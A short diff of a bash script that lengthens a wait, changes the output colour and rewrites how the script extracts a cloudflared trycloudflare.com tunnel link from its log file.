@@ -58,13 +58,11 @@ start_cloud(){
     fi
     # now extract the link from the logfile .. 
     
-    sleep 6
+    sleep 8
     clear
     banner
-    echo -ne "\e[37;1m Link: "
-    grep -o 'https://[-a-z0-9]*\.trycloudflare.com' ".pk.txt"
-
-    grep -o 'https://[-0-9a-z]*\.trycloudflare.com'
+    echo -ne "\e[36;1m Link: "
+    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2 
 }
 #make a function to download the cloudflared 
 download(){
